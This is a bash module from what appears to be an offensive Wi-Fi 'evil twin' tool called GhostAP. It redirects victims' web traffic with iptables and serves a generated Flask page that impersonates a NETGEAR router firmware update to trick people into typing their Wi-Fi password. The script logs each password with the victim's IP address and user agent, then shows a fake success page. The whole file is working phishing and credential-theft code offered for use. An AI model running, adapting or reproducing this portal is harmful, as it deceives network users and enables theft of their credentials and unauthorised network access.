#!/usr/bin/env bash
# ======================================================================
#  GhostAP — Captive Portal Module
#  Developer: ATHEX BLACK HAT
#  Version: 1.0.0
#  Description: Flask-based captive portal with iptables redirection
#               Captures WiFi passwords via fake router update page
# ======================================================================

# source dependencies
SCRIPT_DIR_CAPTIVE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"

source "${SCRIPT_DIR_CAPTIVE}/config/colors.sh" 2>/dev/null
source "${SCRIPT_DIR_CAPTIVE}/config/settings.conf" 2>/dev/null
source "${SCRIPT_DIR_CAPTIVE}/lib/logger.sh" 2>/dev/null

# ======================================================================
#  GLOBAL VARIABLES
# ======================================================================
PORTAL_PID=""
PORTAL_PID_RET=""  # return value for parent script
PORTAL_IFACE=""
PORTAL_ESSID=""

# ======================================================================
#  SETUP IPTABLES RULES
#  Redirect all HTTP traffic to our portal
# ======================================================================
setup_iptables() {
    local iface="$1"

    if [[ -z "$iface" ]]; then
        log_error "No interface specified for iptables."
        return 1
    fi

    log_info "Configuring iptables rules..."

    # flush existing rules if configured
    if [[ "${IPTABLES_FLUSH_ON_START:-true}" == "true" ]]; then
        iptables --flush 2>/dev/null
        iptables --table nat --flush 2>/dev/null
        iptables --delete-chain 2>/dev/null
        iptables --table nat --delete-chain 2>/dev/null
    fi

    # allow established connections
    iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
    iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT

    # allow DNS (port 53) so victim can resolve (or gets spoofed by dnsmasq)
    if [[ "${IPTABLES_ALLOW_DNS:-true}" == "true" ]]; then
        iptables -A INPUT -p udp --dport 53 -j ACCEPT
        iptables -A INPUT -p tcp --dport 53 -j ACCEPT
        iptables -A FORWARD -p udp --dport 53 -j ACCEPT
        iptables -A FORWARD -p tcp --dport 53 -j ACCEPT
    fi

    # redirect HTTP (port 80) to our portal
    if [[ "${IPTABLES_CAPTURE_HTTP:-true}" == "true" ]]; then
        iptables -t nat -A PREROUTING -i "$iface" -p tcp --dport 80 -j DNAT \
            --to-destination "${FAKE_AP_GATEWAY:-10.0.0.1}:${PORTAL_PORT:-80}"
        iptables -A INPUT -i "$iface" -p tcp --dport "${PORTAL_PORT:-80}" -j ACCEPT
    fi

    # redirect HTTPS (port 443) — causes cert errors but captures attempts
    if [[ "${IPTABLES_CAPTURE_HTTPS:-false}" == "true" ]]; then
        iptables -t nat -A PREROUTING -i "$iface" -p tcp --dport 443 -j DNAT \
            --to-destination "${FAKE_AP_GATEWAY:-10.0.0.1}:${PORTAL_PORT:-80}"
        iptables -A INPUT -i "$iface" -p tcp --dport 443 -j ACCEPT
    fi

    # allow forwarding and masquerade for internet passthrough (optional realism)
    iptables -A FORWARD -i "$iface" -j ACCEPT
    iptables -t nat -A POSTROUTING -j MASQUERADE

    # enable IP forwarding
    echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null

    if [[ $? -eq 0 ]]; then
        log_success "iptables rules configured on $iface"
        return 0
    else
        log_error "Failed to configure iptables."
        return 1
    fi
}

# ======================================================================
#  TEARDOWN IPTABLES RULES
# ======================================================================
teardown_iptables() {
    log_info "Removing iptables rules..."

    iptables --flush 2>/dev/null
    iptables --table nat --flush 2>/dev/null
    iptables --delete-chain 2>/dev/null
    iptables --table nat --delete-chain 2>/dev/null

    # restore default policies
    iptables -P INPUT ACCEPT 2>/dev/null
    iptables -P FORWARD ACCEPT 2>/dev/null
    iptables -P OUTPUT ACCEPT 2>/dev/null

    # disable IP forwarding
    echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null

    log_success "iptables rules removed."
}

# ======================================================================
#  GENERATE PORTAL PYTHON SCRIPT
#  Writes the Flask app to a temp location
# ======================================================================
generate_portal_script() {
    local portal_script="/tmp/ghostap_portal.py"
    local essid="${1:-Unknown Network}"
    local theme_color="${PORTAL_THEME_COLOR:-#e94560}"
    local company="${PORTAL_COMPANY:-NETGEAR}"

    log_debug "Generating captive portal script..."

    cat > "$portal_script" << PORTALEOF
#!/usr/bin/env python3
# GhostAP Captive Portal — ATHEX BLACK HAT
import os
import sys
from datetime import datetime
from flask import Flask, request, render_template_string

app = Flask(__name__)
LOG_FILE = "${PASSWORD_FILE:-/tmp/ghostap_passwords.txt}"
SIGNAL_FILE = "${CAPTURE_SIGNAL:-/tmp/ghostap_captured}"
TARGET_ESSID = "${essid}"
PORTAL_COLOR = "${theme_color}"
COMPANY = "${company}"

HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>''' + COMPANY + ''' — Router Security Update</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: rgba(22, 33, 62, 0.95);
            border-radius: 16px;
            padding: 40px 30px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5),
                        0 0 0 1px rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
        }
        .icon-lock {
            font-size: 56px;
            margin-bottom: 20px;
            filter: drop-shadow(0 0 20px ''' + PORTAL_COLOR + ''');
        }
        h2 {
            color: #ffffff;
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 8px;
        }
        .subtitle {
            color: #8892b0;
            font-size: 14px;
            margin-bottom: 24px;
            line-height: 1.5;
        }
        .network-badge {
            display: inline-block;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 20px;
            padding: 6px 16px;
            margin-bottom: 20px;
            color: ''' + PORTAL_COLOR + ''';
            font-size: 13px;
            font-weight: 600;
            letter-spacing: 0.5px;
        }
        .input-group {
            margin-bottom: 18px;
            text-align: left;
        }
        .input-group label {
            display: block;
            color: #ccd6f6;
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 6px;
        }
        input[type="password"] {
            width: 100%;
            padding: 14px 16px;
            background: rgba(15, 52, 96, 0.6);
            border: 2px solid rgba(255, 255, 255, 0.08);
            border-radius: 10px;
            color: #ffffff;
            font-size: 15px;
            transition: all 0.3s ease;
            outline: none;
        }
        input[type="password"]:focus {
            border-color: ''' + PORTAL_COLOR + ''';
            box-shadow: 0 0 0 3px rgba(''' + str(int(PORTAL_COLOR[1:3], 16)) + ''', ''' + str(int(PORTAL_COLOR[3:5], 16)) + ''', ''' + str(int(PORTAL_COLOR[5:7], 16)) + ''', 0.15);
            background: rgba(15, 52, 96, 0.9);
        }
        input[type="password"]::placeholder {
            color: rgba(255, 255, 255, 0.25);
        }
        .btn-submit {
            width: 100%;
            padding: 14px;
            background: ''' + PORTAL_COLOR + ''';
            color: #ffffff;
            border: none;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            letter-spacing: 0.5px;
            margin-top: 6px;
        }
        .btn-submit:hover {
            filter: brightness(1.15);
            transform: translateY(-1px);
            box-shadow: 0 8px 25px rgba(''' + str(int(PORTAL_COLOR[1:3], 16)) + ''', ''' + str(int(PORTAL_COLOR[3:5], 16)) + ''', ''' + str(int(PORTAL_COLOR[5:7], 16)) + ''', 0.4);
        }
        .footer-text {
            color: #495670;
            font-size: 11px;
            margin-top: 18px;
        }
        .footer-text span {
            color: ''' + PORTAL_COLOR + ''';
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon-lock">&#128274;</div>
        <h2>Router Firmware Update Required</h2>
        <p class="subtitle">A critical security patch is available for your router.<br>Please verify your identity to proceed.</p>
        <div class="network-badge">&#128246; Network: ''' + TARGET_ESSID + '''</div>
        <form method="POST" action="/">
            <div class="input-group">
                <label>WiFi Password</label>
                <input type="password" name="password" placeholder="Enter your WiFi password" required autofocus autocomplete="off">
            </div>
            <button type="submit" class="btn-submit">Verify &amp; Install Update</button>
        </form>
        <p class="footer-text">Protected by <span>''' + COMPANY + '''</span> Secure Portal &bull; Connection will resume automatically</p>
    </div>
</body>
</html>
'''

SUCCESS_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Update Complete</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .card {
            background: rgba(22, 33, 62, 0.95);
            border-radius: 16px;
            padding: 40px 30px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(10px);
        }
        .icon-check {
            font-size: 64px;
            margin-bottom: 20px;
            animation: pop 0.5s ease;
        }
        @keyframes pop {
            0% { transform: scale(0); }
            70% { transform: scale(1.2); }
            100% { transform: scale(1); }
        }
        h2 {
            color: #00ff88;
            font-size: 22px;
            margin-bottom: 10px;
        }
        p {
            color: #8892b0;
            font-size: 14px;
            line-height: 1.6;
        }
        .progress {
            margin-top: 24px;
            height: 4px;
            background: rgba(255,255,255,0.05);
            border-radius: 2px;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%;
            width: 100%;
            background: #00ff88;
            border-radius: 2px;
            animation: fill 2s ease;
        }
        @keyframes fill {
            from { width: 0%; }
            to { width: 100%; }
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon-check">&#9989;</div>
        <h2>Update Installed Successfully</h2>
        <p>Your router firmware has been updated.<br>You will be reconnected to your network automatically.</p>
        <div class="progress">
            <div class="progress-bar"></div>
        </div>
    </div>
</body>
</html>
'''

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        password = request.form.get('password', '').strip()
        ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'Unknown')
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        log_entry = f"[{timestamp}] ESSID: {TARGET_ESSID} | Password: {password} | IP: {ip} | UA: {user_agent}\\n"

        # write to log file
        with open(LOG_FILE, 'a') as f:
            f.write(log_entry)

        # write capture signal for parent script
        with open(SIGNAL_FILE, 'w') as sf:
            sf.write(password)

        # print to stdout (captured by xterm log)
        print(f"\\n{'='*55}", flush=True)
        print(f"  🔑 PASSWORD CAPTURED", flush=True)
        print(f"  ESSID    : {TARGET_ESSID}", flush=True)
        print(f"  Password : {password}", flush=True)
        print(f"  IP       : {ip}", flush=True)
        print(f"  Time     : {timestamp}", flush=True)
        print(f"{'='*55}\\n", flush=True)

        return SUCCESS_HTML

    return HTML

if __name__ == '__main__':
    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    app.run(host='0.0.0.0', port=${PORTAL_PORT:-80}, debug=False)
PORTALEOF

    chmod +x "$portal_script"
    echo "$portal_script"
}

# ======================================================================
#  START CAPTIVE PORTAL
#  Args: $1 = target ESSID, $2 = interface
#  Sets: PORTAL_PID, PORTAL_PID_RET
# ======================================================================
start_portal() {
    local essid="${1:-Unknown Network}"
    local iface="$2"

    if [[ -z "$iface" ]]; then
        log_error "No interface specified for captive portal."
        return 1
    fi

    PORTAL_ESSID="$essid"
    PORTAL_IFACE="$iface"

    # setup iptables
    setup_iptables "$iface"
    if [[ $? -ne 0 ]]; then
        log_error "iptables setup failed. Portal may not work."
    fi

    # generate portal script
    log_info "Generating captive portal page..."
    local portal_script
    portal_script=$(generate_portal_script "$essid")

    if [[ ! -f "$portal_script" ]]; then
        log_error "Failed to generate portal script."
        return 1
    fi

    # ensure capture signal file doesn't already exist
    rm -f "${CAPTURE_SIGNAL:-/tmp/ghostap_captured}"

    # start flask portal
    log_info "Launching captive portal on ${iface}..."
    log_info "Portal URL: http://${FAKE_AP_GATEWAY:-10.0.0.1}:${PORTAL_PORT:-80}"

    if [[ "${SHOW_XTERM_WINDOWS:-true}" == "true" ]]; then
        # open in xterm so user can see live logs
        xterm -T "GhostAP — Captive Portal [${essid}]" \
              -geometry 80x20+600+400 \
              -e "python3 ${portal_script}" &
        PORTAL_PID=$!
    else
        # run in background silently
        python3 "$portal_script" &
        PORTAL_PID=$!
    fi

    sleep 2

    # verify portal is running
    if kill -0 "$PORTAL_PID" 2>/dev/null; then
        log_success "Captive portal running (PID: $PORTAL_PID)"
        export PORTAL_PID_RET="$PORTAL_PID"
        return 0
    else
        log_error "Captive portal failed to start."
        return 1
    fi
}

# ======================================================================
#  STOP CAPTIVE PORTAL
# ======================================================================
stop_portal() {
    log_info "Stopping captive portal..."

    if [[ -n "$PORTAL_PID" ]]; then
        kill_process_safe "$PORTAL_PID" "Captive Portal"
        PORTAL_PID=""
    fi

    # kill any remaining flask processes
    pkill -f "ghostap_portal.py" 2>/dev/null

    # teardown iptables
    teardown_iptables

    # remove temp portal script
    rm -f /tmp/ghostap_portal.py 2>/dev/null

    log_success "Captive portal stopped."
}

# ======================================================================
#  CHECK FOR CAPTURE
#  Polls the capture signal file
#  Returns: 0 if password captured, 1 if still waiting
# ======================================================================
check_capture() {
    if [[ -f "${CAPTURE_SIGNAL:-/tmp/ghostap_captured}" ]]; then
        return 0
    fi
    return 1
}

# ======================================================================
#  GET CAPTURED PASSWORD
#  Echoes: captured password, or empty string
# ======================================================================
get_captured_password() {
    if [[ -f "${CAPTURE_SIGNAL:-/tmp/ghostap_captured}" ]]; then
        cat "${CAPTURE_SIGNAL:-/tmp/ghostap_captured}"
    fi
}

# ======================================================================
#  WAIT FOR CAPTURE WITH TIMEOUT
#  Args: $1 = timeout in seconds (0 = infinite)
#  Returns: 0 if captured, 1 if timeout
# ======================================================================
wait_for_capture() {
    local timeout="${1:-${ATTACK_TIMEOUT:-300}}"
    local count=0

    log_info "Waiting for password capture..."
    log_info "Timeout: ${timeout}s (0 = infinite)"

    while true; do
        if check_capture; then
            local password
            password=$(get_captured_password)
            log_capture "$PORTAL_ESSID" "$password"
            return 0
        fi

        # timeout check
        if [[ "$timeout" -gt 0 ]]; then
            count=$((count + 1))
            if [[ "$count" -ge "$timeout" ]]; then
                log_warn "Capture timeout reached (${timeout}s)."
                return 1
            fi
        fi

        sleep 1
    done
}

# ======================================================================
#  END OF CAPTIVE PORTAL MODULE
# ======================================================================